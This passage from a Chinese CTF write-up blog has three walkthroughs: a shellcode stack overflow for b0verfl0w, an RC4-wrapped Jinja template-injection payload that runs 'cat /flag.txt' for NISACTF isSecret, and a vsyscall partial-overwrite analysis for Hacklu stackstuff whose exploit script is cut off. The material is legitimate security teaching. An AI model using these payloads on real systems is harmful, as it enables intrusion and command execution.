class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode, from https://shell-storm.org/shellcode/files/shellcode-811.html</span></span><br><span class="line">shcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span>   </span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0804836a</span></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>)	<span class="comment"># move esp back to s, then jmp to esp</span></span><br><span class="line"></span><br><span class="line">proc.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>, shcode.ljust(<span class="number">0x24</span>, <span class="string">b&#x27;h&#x27;</span>) + p32(jmp_esp) + sub_esp_jmp)</span><br><span class="line"></span><br><span class="line">proc.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/04/NISACTF2022-isSecret-wp/" >NISACTF2022-isSecret-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-04
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2102">题目链接</a>  </p>
<p>显示<code>Welcome To Find Secret</code></p>
<p>访问<code>/secret</code>，看到<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>传secret参数<code>/secret?secret=123456</code>发现报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File &quot;/app/app.py&quot;, line 35, in secret</span></span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>RC4解密后进行render渲染，很明显直接模板注入</p>
<h3 id="RC4加密脚本："><a href="#RC4加密脚本：" class="headerlink" title="RC4加密脚本："></a>RC4加密脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key=<span class="string">&quot;HereIsTreasure&quot;</span>, message=<span class="string">&quot;ciscn&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是：%s&quot;</span> % quote(cipher))</span><br><span class="line">    <span class="comment"># print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>, <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后传参secret，即可获取flag</p>

	
	</div>
  <a type="button" href="/2023/09/04/NISACTF2022-isSecret-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/03/Hacklu2015-stackstuff-wp/" >nightmare 7.1.1.Hacklu2015-stackstuff-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-03
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/15-partial_overwrite/hacklu15_stackstuff">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec stackstuff </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><code>14#</code>设定在端口1514监听，<code>24#accept</code>接收到socket之后fork出子进程，执行<code>37#execl</code>，即执行到<code>4#handle_request</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">   <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(*argv, <span class="string">&quot;reexec&quot;</span>)) &#123;</span><br><span class="line">        handle_request();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        v4 = socket(<span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        fd = negchke(v4, <span class="string">&quot;unable to create socket&quot;</span>);</span><br><span class="line">        *(_QWORD *)&amp;addr.sa_family = <span class="number">10LL</span>;</span><br><span class="line">        *(_QWORD *)&amp;addr.sa_data[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">        v15 = <span class="number">0LL</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        *(_WORD *)addr.sa_data = htons(<span class="number">1514u</span>);</span><br><span class="line">        optval = <span class="number">1</span>;</span><br><span class="line">        v5 = setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>);</span><br><span class="line">        negchke(v5, <span class="string">&quot;unable to set SO_REUSEADDR&quot;</span>);</span><br><span class="line">        v6 = bind(fd, &amp;addr, <span class="number">0x1C</span>u);</span><br><span class="line">        negchke(v6, <span class="string">&quot;unable to bind&quot;</span>);</span><br><span class="line">        v7 = listen(fd, <span class="number">16</span>);</span><br><span class="line">        negchke(v7, <span class="string">&quot;unable to listen&quot;</span>);</span><br><span class="line">        signal(<span class="number">17</span>, (<span class="type">__sighandler_t</span>)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            v8 = accept(fd, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">            v18 = negchke(v8, <span class="string">&quot;unable to accept&quot;</span>);</span><br><span class="line">            v9 = fork();</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="type">unsigned</span> <span class="type">int</span>)negchke(v9, <span class="string">&quot;unable to fork&quot;</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            close(v18);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        v10 = dup2(v18, <span class="number">0</span>);</span><br><span class="line">        negchke(v10, <span class="string">&quot;unable to dup2&quot;</span>);</span><br><span class="line">        v11 = dup2(v18, <span class="number">1</span>);</span><br><span class="line">        negchke(v11, <span class="string">&quot;unable to dup2&quot;</span>);</span><br><span class="line">        close(v18);</span><br><span class="line">        v12 = execl(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;reexec&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">        negchke(v12, <span class="string">&quot;unable to reexec&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="handle-request"><a href="#handle-request" class="headerlink" title="handle_request"></a>handle_request</h3><p>读取密码，<code>15#require_auth</code>进行验证，验证通过输出flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> v1[<span class="number">64</span>];  <span class="comment">// [rsp+0h] [rbp-58h] BYREF</span></span><br><span class="line">    FILE *v2;     <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line">    FILE *stream; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">    stream = fopen(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!stream || !fgets(real_password, <span class="number">50</span>, stream)) &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;unable to read real_password\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x1D</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hi! This is the flag download service.&quot;</span>);</span><br><span class="line">    require_auth();</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!v2 || !fgets(v1, <span class="number">50</span>, v2)) &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;unable to read flag\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x14</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="require-auth-gt-check-password-correct"><a href="#require-auth-gt-check-password-correct" class="headerlink" title="require_auth  -&gt; check_password_correct"></a>require_auth  -&gt; check_password_correct</h3><p>读取长度，超过50则置为90，明显栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">check_password_correct</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> v0;    <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v2;       <span class="comment">// [rsp+Ch] [rbp-4Ch] BYREF</span></span><br><span class="line">    <span class="type">char</span> ptr[<span class="number">50</span>]; <span class="comment">// [rsp+10h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="keyword">sizeof</span>(ptr));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To download the flag, you need to specify a password.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Length of password: &quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d\n&quot;</span>, &amp;v2) != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">50</span>)</span><br><span class="line">        v2 = <span class="number">90</span>;</span><br><span class="line">    v0 = fread(ptr, <span class="number">1uLL</span>, v2, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (v0 != v2)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(ptr, real_password) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="子进程中check-password-correct调试方法"><a href="#子进程中check-password-correct调试方法" class="headerlink" title="子进程中check_password_correct调试方法"></a>子进程中check_password_correct调试方法</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># terminal 1</span></span><br><span class="line">$ gdb stackstuff</span><br><span class="line">gef➤  <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">gef➤  b check_password_correct</span><br><span class="line">gef➤  r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在另一个terminal 2</span></span><br><span class="line">$ nc 127.0.0.1 1514</span><br><span class="line"></span><br><span class="line"><span class="comment"># terminal 1 中即可看到运行到check_password_correct</span></span><br></pre></td></tr></table></figure>

<p>程序虽然存在栈溢出，但是开了PIE也没有泄露的地方  首先想着能不能直接覆盖返回地址的低位字节控制跳转</p>
<p>gdb调试进入到<code>check_password_correct</code>，获取输入到ret_addr的偏移量为<code>0x7fffffffe398 - 0x007fffffffe350 = 0x48</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x555555400f7e → check_password_correct()</span><br><span class="line">[#1] 0x555555400fd1 → require_auth()</span><br><span class="line">[#2] 0x55555540108b → handle_request()</span><br><span class="line">[#3] 0x55555540112d → main()</span><br><span class="line"></span><br><span class="line">gef➤  info f</span><br><span class="line">Stack level 0, frame at 0x7fffffffe3a0:</span><br><span class="line"> rip = 0x555555400f7e in check_password_correct; saved rip = 0x555555400fd1</span><br><span class="line"> called by frame at 0x7fffffffe3b0</span><br><span class="line"> Arglist at 0x7fffffffe338, args: </span><br><span class="line"> Locals at 0x7fffffffe338, Previous frame&#x27;s sp is 0x7fffffffe3a0</span><br><span class="line"> Saved registers:</span><br><span class="line">  rip at 0x7fffffffe398	# ret addr</span><br><span class="line"></span><br><span class="line">gef➤  stack 15</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x007fffffffe340│+0x0000: 0x007ffff7f98760  →  0x00000000fbad2887	 ← $rsp</span><br><span class="line">0x007fffffffe348│+0x0008: 0x0000005af7e47283</span><br><span class="line">0x007fffffffe350│+0x0010: &quot;afdsfasdfasdf\ngasfdasffffffffffffffffffffffffffff[...]&quot;</span><br><span class="line">0x007fffffffe358│+0x0018: &quot;fasdf\ngasfdasffffffffffffffffffffffffffffffffffff[...]&quot;</span><br><span class="line">0x007fffffffe360│+0x0020: &quot;sfdasfffffffffffffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe368│+0x0028: &quot;ffffffffffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe370│+0x0030: &quot;ffffffffffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe378│+0x0038: &quot;ffffffffffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe380│+0x0040: &quot;ffffffffffffffff\n&quot;</span><br><span class="line">0x007fffffffe388│+0x0048: &quot;ffffffff\n&quot;</span><br><span class="line">0x007fffffffe390│+0x0050: 0x0000000000000a (&quot;\n&quot;?)</span><br><span class="line">0x007fffffffe398│+0x0058: 0x00555555400fd1  →  &lt;require_auth+23&gt; test eax, eax</span><br><span class="line">0x007fffffffe3a0│+0x0060: 0x0000000000000000</span><br><span class="line">0x007fffffffe3a8│+0x0068: 0x0055555540108b  →  &lt;handle_request+177&gt; lea rsi, [rip+0x36d]        # 0x5555554013ff</span><br><span class="line">0x007fffffffe3b0│+0x0070: 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>但是read长度为<code>90 == 0x5a</code>，所以还要往下写0x12个字节，那么整个返回地址都会被覆盖掉，这个方法也就不行了</p>
<p>但是发现能刚刚好覆盖<code>0x0x007fffffffe3a8</code>处上层栈帧的返回地址的最低两个字节，即<code>require_auth</code>成功执行结束后开始读取flag的地址，明显也就是我们想要的跳转地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000106D loc_106D:</span><br><span class="line">.text:000000000000106D mov     rax, [rsp+58h+stream]</span><br><span class="line">.text:0000000000001072 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001075 call    _fclose</span><br><span class="line">.text:000000000000107A lea     rdi, aHiThisIsTheFla ; &quot;Hi! This is the flag download service.&quot;</span><br><span class="line">.text:0000000000001081 call    _puts</span><br><span class="line">.text:0000000000001086 call    require_auth</span><br><span class="line">.text:000000000000108B lea     rsi, modes      ; &quot;r&quot;</span><br><span class="line">.text:0000000000001092 lea     rdi, aFlag      ; &quot;flag&quot;</span><br><span class="line">.text:0000000000001099 call    _fopen</span><br></pre></td></tr></table></figure>

<p>现在目标就是在栈上写两个<code>ret</code>指令的地址并覆盖<code>0x0x007fffffffe3a8</code>处最低两个字节保持地址值不变即可</p>
<h3 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h3><p>即使开了PIE随机化，还有一个<code>vsyscall</code>段，它的地址是固定的，其中有ret指令可以满足我们的要求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff</span><br><span class="line">0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff</span><br><span class="line">0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]		# here  （环境为ubuntu22.08）</span><br><span class="line">gef➤  x/4i 0xffffffffff600800</span><br><span class="line">   0xffffffffff600800:    mov    rax,0x135</span><br><span class="line">   0xffffffffff600807:    syscall</span><br><span class="line">   0xffffffffff600809:    ret    </span><br><span class="line">   0xffffffffff60080a:    int3</span><br></pre></td></tr></table></figure>

<p>注意不论怎么随机化最低12bit的<code>08b</code>是不变的（页对齐），因此需要爆破倒数第二个字节，但最多也只需爆破16次，即从<code>0x008b,0x108b...0xf08b</code></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdbyte = <span class="number">0x00</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client = 